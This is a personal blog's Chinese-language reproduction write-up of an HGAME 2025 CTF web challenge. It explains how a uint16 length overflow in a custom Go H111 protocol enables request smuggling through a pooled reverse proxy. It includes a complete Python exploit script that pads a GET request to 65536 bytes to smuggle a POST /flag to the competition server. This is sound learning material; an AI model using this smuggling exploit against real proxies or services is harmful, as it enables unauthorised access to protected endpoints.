<!DOCTYPE html>
<html lang="en">
<style>
    p{
        margin-top: 0 !important;
        margin-bottom: 1rem !important;
        font-size: 1.1rem;
    }
    figure{
        margin: 0 !important;
    }
    pre{
        padding: 0 !important;
        margin-top: 0 !important;
        margin-bottom: 1rem !important;
    }

    td{
        padding: 0 !important;
        margin-bottom: 1rem !important;
    }
    h1,h2,h3,h4,h5,h6{
        margin-top: 0 !important;
        margin-bottom: 1rem !important;
    }
</style>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zer0 - 不存在的车厢复现</title>
    <link rel="stylesheet" href="/css/styles.css">
    <link rel="stylesheet" href="/css/tailwind.css">
    <link rel="stylesheet" href="/css/highlight.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs/themes/prism-tomorrow.min.css">
<script src="/js/snowstorm.js"></script>

<header class="bg-black text-hacker-white py-4 font-dos font-extrabold">
    <div class="container mx-auto flex items-center justify-between space-x-8">
    
      <h1 class="text-2xl font-bold ml-[100px] md:ml-0 animate-pulse text-hacker-color1 md:mr-[20%]">
        <a href="/" class="hover:text-white transition-colors select-none">
          Zer0
        </a>
      </h1>
  
    <!-- 大屏幕 -->
      <nav class="hidden md:block">
        <ul class="flex space-x-6">
          
            <li>
              <a href="/" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Home
              </a>
            </li>
          
            <li>
              <a href="/archives" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Archives
              </a>
            </li>
          
            <li>
              <a href="/about" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                About
              </a>
            </li>
          
            <li>
              <a href="/link" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Friends
              </a>
            </li>
          
        </ul>
      </nav>
  
      <!-- 小屏幕 -->
      <button id="menu-toggle" class="block md:hidden text-white focus:outline-none">
        <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
        </svg>
      </button>
    </div>
  
    <!-- 折叠菜单 -->
    <nav id="mobile-menu" class="hidden bg-black">
      <ul class="space-y-2 py-4 px-6">
        
          <li>
            <a href="/" class="block text-white hover:text-hacker-color1 transition-colors">
              Home
            </a>
          </li>
        
          <li>
            <a href="/archives" class="block text-white hover:text-hacker-color1 transition-colors">
              Archives
            </a>
          </li>
        
          <li>
            <a href="/about" class="block text-white hover:text-hacker-color1 transition-colors">
              About
            </a>
          </li>
        
          <li>
            <a href="/link" class="block text-white hover:text-hacker-color1 transition-colors">
              Friends
            </a>
          </li>
        
      </ul>
    </nav>
  
    <!-- RSS Link -->
    <link rel="alternate" type="application/rss+xml" title=" RSS" href="/rss.xml" />
  </header>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lunr.js/2.3.9/lunr.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="/js/search.js"></script>
  <script>
        document.addEventListener("DOMContentLoaded", () => {
    const menuToggle = document.getElementById("menu-toggle");
    const mobileMenu = document.getElementById("mobile-menu");

    menuToggle.addEventListener("click", () => {
        if (mobileMenu.classList.contains("hidden")) {
        mobileMenu.classList.remove("hidden");
        } else {
        mobileMenu.classList.add("hidden");
        }
    });
    });

  </script>
  

<meta name="generator" content="Hexo 7.2.0"></head>
<body class="bg-black text-hacker-color3 container mx-auto">
    <!-- 文章标题 -->
    <h1 class="text-5xl text-hacker-color1 font-bold font-dos my-6 text-center">不存在的车厢复现</h1>

    <!-- 发布时间 -->
    <p class="text-hacker-color3 text-center text-sm mb-4">
        2025-02-19
    </p>

    <!-- 文章内容 -->
    <div id="article-content" class="article-entry prose prose-invert mx-auto max-w-4xl leading-relaxed highlight">
        <h1 id="2025-hgame-不存在的车厢复现"><a href="#2025-hgame-不存在的车厢复现" class="headerlink" title="2025 hgame-不存在的车厢复现"></a>2025 hgame-不存在的车厢复现</h1><p>官方WP思路如下：</p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502191311489.png" alt="image-20250219131123627"></p>
<p>题目给了源码，分析代码可得</p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502191313910.png" alt="image-20250219131301665"></p>
<p>开放的是8081端口</p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502191313777.png" alt="image-20250219131343825"></p>
<p>flag在8080端口</p>
<p>当我们用GET方式访问，会得到Welcome to HGAME 2025响应，用POST的话，代理会直接拒绝，做题时，想到了用走私通过8081端口走私8080拿到flag，但是看不明白request.go，没想到整数溢出，这道题确实受益匪浅</p>
<h4 id="分析request-go"><a href="#分析request-go" class="headerlink" title="分析request.go"></a>分析request.go</h4><h5 id="写入函数分析"><a href="#写入函数分析" class="headerlink" title="写入函数分析"></a>写入函数分析</h5><p>这段 Go 代码实现了一个自定义的 <strong>H111</strong> 请求协议，能够序列化（写入）和反序列化（读取）<code>http.Request</code>。它包含两个核心函数：</p>
<ol>
<li><code>ReadH111Request(reader io.Reader) (*http.Request, error)</code><br><strong>从二进制流读取数据，并构造 HTTP 请求</strong></li>
<li><code>WriteH111Request(writer io.Writer, req *http.Request) error</code><br><strong>将 HTTP 请求序列化为二进制数据流</strong></li>
</ol>
<p>在 <code>WriteH111Request()</code> 里，数据长度是这样写入的：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go">binary.Write(writer, binary.BigEndian, <span class="hljs-type">uint16</span>(<span class="hljs-built_in">len</span>(methodBytes)))<br></code></pre></td></tr></table></figure>

<p>如果 <code>methodBytes</code> 长度 <strong>意外超过 65535</strong>，例如：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go">methodBytes := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">65536</span>) <span class="hljs-comment">// 长度 = 65536</span><br>binary.Write(writer, binary.BigEndian, <span class="hljs-type">uint16</span>(<span class="hljs-built_in">len</span>(methodBytes))) <br></code></pre></td></tr></table></figure>

<p>举个例子给你们看</p>
<figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>	<span class="hljs-keyword">var</span> num1 <span class="hljs-type">int</span> = <span class="hljs-number">65536</span><br>	<span class="hljs-keyword">var</span> num2 <span class="hljs-type">int</span> = <span class="hljs-number">65537</span><br>	<span class="hljs-keyword">var</span> num3 <span class="hljs-type">int</span> = <span class="hljs-number">65538</span><br>	<span class="hljs-keyword">var</span> num4 <span class="hljs-type">int</span> = <span class="hljs-number">131072</span><br><br>	fmt.Println(<span class="hljs-string">&quot;uint16(65536):&quot;</span>, <span class="hljs-type">uint16</span>(num1))  <span class="hljs-comment">// 65536 溢出，变成 0</span><br>	fmt.Println(<span class="hljs-string">&quot;uint16(65537):&quot;</span>, <span class="hljs-type">uint16</span>(num2))  <span class="hljs-comment">// 65537 溢出，变成 1</span><br>	fmt.Println(<span class="hljs-string">&quot;uint16(65538):&quot;</span>, <span class="hljs-type">uint16</span>(num3))  <span class="hljs-comment">// 65538 溢出，变成 2</span><br>	fmt.Println(<span class="hljs-string">&quot;uint16(131072):&quot;</span>, <span class="hljs-type">uint16</span>(num4)) <span class="hljs-comment">// 131072 溢出，变成 0</span><br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>输出就是<br><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502191405396.png" alt="image-20250219140558300"></p>
<h5 id="读取函数分析"><a href="#读取函数分析" class="headerlink" title="读取函数分析"></a>读取函数分析</h5><p>在 <code>ReadH111Request()</code> 里，数据是按 <code>Len+Data</code> 方式解析的：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> methodLength <span class="hljs-type">uint16</span><br>binary.Read(reader, binary.BigEndian, &amp;methodLength)<br><br>method := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-type">int</span>(methodLength))<br>_, err := io.ReadFull(reader, method)<br></code></pre></td></tr></table></figure>

<p>如果 <code>methodLength == 0x0000</code>（因为 <code>65536</code> 溢出到 <code>0</code>），则：</p>
<ul>
<li><strong><code>make([]byte, 0)</code></strong> 创建的是空数组。</li>
<li><code>io.ReadFull(reader, method)</code> 直接跳过 <code>method</code> 的读取。</li>
<li><strong>方法字段的数据仍然存在流中，但没有被解析，导致后续数据错位，从而保留我们的POST请求！</strong></li>
</ul>
<p>当 <code>bodyLength == 0</code>，但实际 <code>65519</code> 个字节仍然在 TCP 流里。</p>
<h4 id="分析main-go"><a href="#分析main-go" class="headerlink" title="分析main.go"></a>分析main.go</h4><p>处理客户端连接使用了无限for循环</p>
<figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> &#123;<br>	conn, err := listener.Accept()<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		log.Println(err)<br>		<span class="hljs-keyword">continue</span><br>	&#125;<br>	<span class="hljs-keyword">go</span> serverH111(conn)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">serverH111</span><span class="hljs-params">(conn net.Conn)</span></span> &#123;<br>	<span class="hljs-keyword">defer</span> conn.Close()<br>	<span class="hljs-keyword">for</span> &#123;<br>		req, err := h111.ReadH111Request(conn)<br>		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>			log.Println(err)<br>			<span class="hljs-keyword">return</span><br>		&#125;<br>		recorder := httptest.NewRecorder()<br>		mux.ServeHTTP(recorder, req)<br>		resp := recorder.Result()<br>		log.Printf(<span class="hljs-string">&quot;Received request %s %s, response status code %d&quot;</span>, req.Method, req.URL.Path, resp.StatusCode)<br>		err = h111.WriteH111Response(conn, resp)<br>		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>			log.Println(err)<br>			<span class="hljs-keyword">return</span><br>		&#125;<br>	&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><code>for &#123;&#125;</code> 无限循环，不断接受新的连接。</p>
<h4 id="分析反向代理main-go"><a href="#分析反向代理main-go" class="headerlink" title="分析反向代理main.go"></a>分析反向代理main.go</h4><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>	pool = sync.Pool&#123;<br>		New: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-keyword">interface</span>&#123;&#125; &#123;<br>			<span class="hljs-keyword">for</span> &#123;<br>				conn, err := net.Dial(<span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-string">&quot;127.0.0.1:8080&quot;</span>)<br>				<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>					fmt.Println(<span class="hljs-string">&quot;error dialing to backend server&quot;</span>)<br>					time.Sleep(time.Millisecond * <span class="hljs-number">300</span>)<br>					<span class="hljs-keyword">continue</span><br>				&#125;<br>				<span class="hljs-keyword">return</span> conn<br>			&#125;<br>		&#125;,<br>	&#125;<br>	http.ListenAndServe(<span class="hljs-string">&quot;:8081&quot;</span>, &amp;proxyHandler&#123;&#125;)<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><strong><code>sync.Pool&#123; New: func() &#123; ... &#125; &#125;</code></strong></p>
<ul>
<li>定义了连接池的 <code>New</code> 函数：<strong>当连接池为空时，会创建一个新的 TCP 连接</strong>。</li>
</ul>
<p><strong>使用 <code>sync.Pool</code> 作为连接池，优化 TCP 连接复用，我们可以利用这一点</strong></p>
<h4 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a>实施攻击</h4><p>根据上面的分析，我们的攻击思路就是通过构造一个长度等于65536的GET请求，通过溢出归0，走私我们的POST请求</p>
<p>官方WP是用的yakit发包，我用到yakit比较少，写了个脚本</p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502191519027.png" alt="image-20250219151908490"></p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_h111_request</span>():<br>    method = <span class="hljs-string">b&#x27;POST&#x27;</span><br>    uri = <span class="hljs-string">b&#x27;/flag&#x27;</span><br>    headers = &#123;&#125;  <span class="hljs-comment"># 无请求头</span><br>    body = <span class="hljs-string">b&#x27;&#x27;</span>    <span class="hljs-comment"># 空请求体</span><br><br>    data = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-comment"># 方法部分</span><br>    data += struct.pack(<span class="hljs-string">&#x27;&gt;H&#x27;</span>, <span class="hljs-built_in">len</span>(method))  <span class="hljs-comment"># 方法长度（大端序2字节）</span><br>    data += method                          <span class="hljs-comment"># 方法内容</span><br>    <span class="hljs-comment"># URI部分</span><br>    data += struct.pack(<span class="hljs-string">&#x27;&gt;H&#x27;</span>, <span class="hljs-built_in">len</span>(uri))     <span class="hljs-comment"># URI长度</span><br>    data += uri                             <span class="hljs-comment"># URI内容</span><br>    <span class="hljs-comment"># 请求头部分</span><br>    data += struct.pack(<span class="hljs-string">&#x27;&gt;H&#x27;</span>, <span class="hljs-built_in">len</span>(headers)) <span class="hljs-comment"># 请求头数量</span><br>    <span class="hljs-keyword">for</span> key, values <span class="hljs-keyword">in</span> headers.items():     <span class="hljs-comment"># 遍历每个请求头（此处无）</span><br>        key_bytes = key.encode()<br>        data += struct.pack(<span class="hljs-string">&#x27;&gt;H&#x27;</span>, <span class="hljs-built_in">len</span>(key_bytes))<br>        data += key_bytes<br>        <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> values:<br>            value_bytes = value.encode()<br>            data += struct.pack(<span class="hljs-string">&#x27;&gt;H&#x27;</span>, <span class="hljs-built_in">len</span>(value_bytes))<br>            data += value_bytes<br>    <span class="hljs-comment"># 请求体部分</span><br>    data += struct.pack(<span class="hljs-string">&#x27;&gt;H&#x27;</span>, <span class="hljs-built_in">len</span>(body))    <span class="hljs-comment"># 请求体长度</span><br>    data += body                            <span class="hljs-comment"># 请求体内容</span><br><br>    <span class="hljs-keyword">return</span> data<br><br>h111_request = build_h111_request()  <span class="hljs-comment"># 返回字节串</span><br><span class="hljs-built_in">print</span>(h111_request)<br><br>length1 = <span class="hljs-built_in">len</span>(h111_request)<br>length2 = <span class="hljs-number">65536</span> - length1<br>h111_request = h111_request + length2 * <span class="hljs-string">b&#x27;0&#x27;</span>  <span class="hljs-comment"># 使用字节而不是字符</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(h111_request))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_http_request</span>(<span class="hljs-params">full_body</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    构造最终的 HTTP 请求</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    request_line = <span class="hljs-string">b&quot;GET /flag HTTP/1.1\r\n&quot;</span><br>    headers = (<br>        <span class="hljs-string">b&quot;Host: node1.hgame.vidar.club:31772\r\n&quot;</span> +<br>        <span class="hljs-string">b&quot;Content-Length: &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(full_body)).encode() + <span class="hljs-string">b&quot;\r\n&quot;</span> +<br>        <span class="hljs-string">b&quot;\r\n&quot;</span><br>    )<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(full_body, <span class="hljs-built_in">str</span>):<br>        full_body = full_body.encode()  <span class="hljs-comment"># 如果是字符串类型，转换为字节串</span><br>    http_request = request_line + headers + full_body<br>    <span class="hljs-keyword">return</span> http_request<br><br>http_request = build_http_request(h111_request)<br><span class="hljs-built_in">print</span>(http_request)<br><br>host = <span class="hljs-string">&quot;node1.hgame.vidar.club&quot;</span><br>port = <span class="hljs-number">31772</span><br><br><span class="hljs-keyword">with</span> socket.create_connection((host, port)) <span class="hljs-keyword">as</span> s:<br>    s.sendall(http_request)<br>    response = <span class="hljs-string">b&quot;&quot;</span><br>    s.settimeout(<span class="hljs-number">5</span>)  <span class="hljs-comment"># 设置更长的超时时间</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            data = s.recv(<span class="hljs-number">4096</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                <span class="hljs-keyword">break</span><br>            response += data<br>        <span class="hljs-keyword">except</span> socket.timeout:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connection timed out!&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(response.decode())<br><br></code></pre></td></tr></table></figure>

<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502192016065.png" alt="image-20250219201613565"></p>
<p>脚本需要多执行几次保持复用</p>

    </div>

    <!-- 返回主页链接 -->
    <div class="text-center my-8">
        <a href="/" class="text-hacker-color1 underline hover:text-hacker-color2">← Back to Home</a>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/prismjs/prism.min.js"></script>
<script>Prism.highlightAll();</script>
<script src="/js/snowstorm.js"></script>


<footer class="bg-black text-gray-400 py-4">
    <div class="container mx-auto text-center">
      <p>© <span id="current-year"></span>  Zer0 
        <br> Powered by <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://github.com/m310ct/hexo-theme-hexploit">Hexpolit</a></p>
    </div>
  </footer>
  
  <script> 
    document.getElementById("current-year").textContent = new Date().getFullYear();
  </script>
  


</body>
</html>
